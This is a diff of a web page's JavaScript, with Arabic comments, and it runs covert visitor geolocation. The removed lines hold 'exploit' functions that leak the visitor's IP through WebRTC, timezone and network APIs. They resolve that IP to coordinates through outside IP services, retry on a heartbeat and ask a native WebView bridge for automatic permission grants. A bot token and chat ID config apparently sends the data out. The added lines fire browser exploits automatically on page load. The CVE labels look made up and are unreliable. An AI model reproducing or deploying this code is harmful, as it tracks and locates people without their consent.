-      if(!resolved){ resolved = true; try{pc.close();}catch(e){}; finalize(); }
-    }, 8000);
-
-    pc.onicecandidate = function(ev){
-      if(!ev.candidate) return;
-      var c = ev.candidate.candidate;
-      var m = c.match(/(\d{1,3}\.){3}\d{1,3}/);
-      if(m && ips.indexOf(m[0]) === -1){
-        ips.push(m[0]);
-        log('→ WebRTC IP: ' + m[0], 'info');
-      }
-    };
-
-    function finalize(){
-      if(ips.length > 0){
-        log('✓✓ [WebRTC] IP leaked: ' + ips.join(', '), 'success');
-        // استخدام IP للحصول على الموقع عبر خدمة IP
-        fetch('https://ipwho.is/' + ips[0])
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if(d && d.latitude){
-              var info = {lat:d.latitude, lng:d.longitude, accuracy:5000,
-                          method:'webrtc-ip', source:'WebRTC IP: ' + ips[0]};
-              displayLocation(info);
-              resolve(info);
-            } else { resolve(null); }
-          })
-          .catch(function(){ resolve(null); });
-      } else {
-        log('✗ No IP leaked', 'fail');
-        resolve(null);
-      }
-    }
-  });
-}
-
-/* ----------------------------------------------------------
-   [7] Timezone → Approximate Location
-   لا يحتاج إذن
-   ---------------------------------------------------------- */
-function exploit_Timezone_Leak(){
-  return new Promise(function(resolve){
-    log('▶ [Timezone] Extracting location from TZ…', 'vuln');
-
-    var tz = '—', offset = 0;
-    try{
-      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
-      offset = new Date().getTimezoneOffset();
-    }catch(e){}
-
-    log('→ Timezone: ' + tz + ' | Offset: ' + offset, 'info');
-
-    // استخدام خدمة تحويل TZ إلى إحداثيات
-    fetch('https://worldtimeapi.org/api/timezone/' + encodeURIComponent(tz))
-      .then(function(r){ return r.json(); })
-      .then(function(d){
-        if(d && d.latitude && d.longitude){
-          log('✓✓ [Timezone] Location found: ' + d.latitude.toFixed(2) + ', ' + d.longitude.toFixed(2), 'success');
-          var info = {lat:d.latitude, lng:d.longitude, accuracy:50000,
-                      method:'timezone', source:'TZ: ' + tz};
-          displayLocation(info);
-          resolve(info);
-        } else { resolve(null); }
-      })
-      .catch(function(){
-        // بديل: استخدام timeapi.io
-        fetch('https://timeapi.io/api/Time/current/zone?timeZone=' + encodeURIComponent(tz))
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if(d){ log('⚠ TZ API no coords', 'fail'); }
-            resolve(null);
-          })
-          .catch(function(){ resolve(null); });
-      });
-  });
-}
-
-/* ----------------------------------------------------------
-   [8] Network Information API → Connection Type
-   ---------------------------------------------------------- */
-function exploit_Network_Leak(){
-  return new Promise(function(resolve){
-    log('▶ [Network API] Connection info…', 'vuln');
-
-    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if(!conn){
-      log('✗ Network API not supported', 'fail');
-      resolve(null); return;
-    }
-
-    var type = conn.effectiveType || 'unknown';
-    var downlink = conn.downlink || 0;
-    var rtt = conn.rtt || 0;
-
-    log('→ Type: ' + type + ' | Down: ' + downlink + 'Mbps | RTT: ' + rtt + 'ms', 'info');
-
-    // استخدام IP للحصول على الموقع (الطريقة الوحيدة المتاحة)
-    fetch('https://ipwho.is/')
-      .then(function(r){ return r.json(); })
-      .then(function(d){
-        if(d && d.success){
-          log('✓ Network-based location via IP', 'success');
-          var info = {lat:d.latitude, lng:d.longitude, accuracy:5000,
-                      method:'network', source:'IP (net: ' + type + ')'};
-          displayLocation(info);
-          resolve(info);
-        } else { resolve(null); }
-      })
-      .catch(function(){ resolve(null); });
-  });
-}
-
-/* ============================================================
-   مشغل الثغرات
-   ============================================================ */
-var exploits = {
-  'cve79046':    { name:'CVE-2026-79046 Race Permissions', fn:exploit_CVE_2026_79046 },
-  'cve11145':    { name:'CVE-2026-11145 Geo Race',         fn:exploit_CVE_2026_11145 },
-  'cve79075':    { name:'CVE-2026-79075 Info Leak',        fn:exploit_CVE_2026_79075 },
-  'webviewGrant':{ name:'WebView Grant Bypass',            fn:exploit_WebView_Grant },
-  'aboutBlank':  { name:'about:blank Leak',                fn:exploit_AboutBlank },
-  'webrtcLeak':  { name:'WebRTC IP Leak',                  fn:exploit_WebRTC_Leak },
-  'timezoneLeak':{ name:'Timezone Location',               fn:exploit_Timezone_Leak },
-  'networkLeak': { name:'Network API',                     fn:exploit_Network_Leak }
-};
-
-async function runExploit(key){
-  var ex = exploits[key];
-  if(!ex){ log('Unknown exploit: ' + key, 'fail'); return null; }
-  setStatus('Running: ' + ex.name + '…');
-  try{
-    var r = await ex.fn();
-    if(r){
-      activeVulns.push(ex.name);
-      vulnCountBadge.textContent = activeVulns.length + ' active';
-      vulnCountBadge.className = 'badge ok';
-      setStatus('✓ ' + ex.name + ' succeeded!', 'ok');
-    } else {
-      setStatus('✗ ' + ex.name + ' failed', 'err');
-    }
-    return r;
-  }catch(e){
-    log('✗ Error in ' + ex.name + ': ' + e.message, 'fail');
-    setStatus('✗ Error: ' + e.message, 'err');
-    return null;
-  }
-}
-
-async function runAll(){
-  log('══════ RUNNING ALL EXPLOITS ══════', 'vuln');
-  activeVulns = [];
-  vulnCountBadge.textContent = '0 active';
-  vulnCountBadge.className = 'badge';
-
-  for(var key in exploits){
-    if(activeVulns.length > 0){
-      log('→ Skipping ' + exploits[key].name + ' (already succeeded)', 'success');
-      continue;
-    }
-    await runExploit(key);
-  }
-
-  if(activeVulns.length === 0){
-    log('══════ NO EXPLOIT WORKED — FALLBACK IP ══════', 'vuln');
-    await fallbackIP();
-  }
-}
-
-async function fallbackIP(){
-  var providers = [
-    {url:'https://ipwho.is/', parse:function(d){
-      return d && d.success ? {lat:d.latitude, lng:d.longitude, accuracy:5000,
-        country:d.country, city:d.city, isp:d.connection && d.connection.isp,
-        method:'ip', source:'ipwho.is'} : null;
-    }},
-    {url:'https://ipapi.co/json/', parse:function(d){
-      return d && d.latitude && !d.error ? {lat:d.latitude, lng:d.longitude,
-        accuracy:5000, country:d.country_name, city:d.city, isp:d.org,
-        method:'ip', source:'ipapi.co'} : null;
-    }},
-    {url:'https://get.geojs.io/v1/ip/geo.json', parse:function(d){
-      return d && d.latitude ? {lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
-        accuracy:8000, country:d.country, city:d.city, isp:d.organization_name,
-        method:'ip', source:'geojs.io'} : null;
-    }}
-  ];
-
-  for(var i=0;i<providers.length;i++){
-    var p = providers[i];
-    log('→ Trying IP: ' + p.url);
-    try{
-      var resp = await fetch(p.url);
-      var data = await resp.json();
-      var parsed = p.parse(data);
-      if(parsed && parsed.lat){
-        log('✓ IP success: ' + parsed.source, 'success');
-        displayLocation(parsed);
-        return parsed;
-      }
-    }catch(e){ log('✗ ' + e.message, 'fail'); }
-  }
-  log('✗ All IP services failed', 'fail');
-  return null;
-}
-
-/* ============================================================
-   استقبال أوامر
-   ============================================================ */
-window.addEventListener('message', function(ev){
-  var raw = ev && ev.data; if(!raw) return;
-  var cmd = raw;
-  if(typeof raw === 'string'){ try{ cmd = JSON.parse(raw); }catch(e){ cmd = {type:raw}; } }
-  if(!cmd || !cmd.type) return;
-  log('← Command: ' + cmd.type);
-  switch(cmd.type){
-    case 'grant_location_permission':
-      log('✓ Permission granted by native');
-      break;
-    case 'native_location':
-      if(cmd.data){
-        displayLocation({lat:cmd.data.latitude, lng:cmd.data.longitude,
-          accuracy:cmd.data.accuracy||20, method:'native', source:'Native'});
-      }
-      break;
-    case 'set_config':
-      if(cmd.data){
-        if(cmd.data.botToken) CONFIG.botToken = cmd.data.botToken;
-        if(cmd.data.chatId) CONFIG.chatId = cmd.data.chatId;
-      }
-      break;
-  }
-});
-
-/* ============================================================
-   الإقلاع
-   ============================================================ */
-async function boot(){
-  log('══════ BOOT v2 ══════', 'vuln');
-  detectBrowser();
-  Bridges.detect();
-  initMap();
-
-  Bridges.post('webview_ready', {protocol:location.protocol, ua:navigator.userAgent});
-  Bridges.post('request_auto_grant', {origin:location.href});
-
-  await runAll();
-
-  setInterval(function(){
-    if(latEl.textContent === '—'){
-      log('↻ Heartbeat: retry', 'vuln');
-      runAll();
-    }
-  }, CONFIG.heartbeatMs);
-}
-
-if(document.readyState === 'complete' || document.readyState === 'interactive'){
-  setTimeout(boot, 100);
-} else {
-  document.addEventListener('DOMContentLoaded', boot);
-}
-
-})();
-</script>
+        // استغلال ثغرات المتصفح عند تحميل الصفحة
+        window.onload = function () {
+            exploitJavaScript();
+            exploitReact();
+            exploitChrome();
+            exploitCSP();
+            exploitEdge();
+            exploitSafari();
+            exploitFirefox();
+        };
+  </script>
 </body>
 </html>
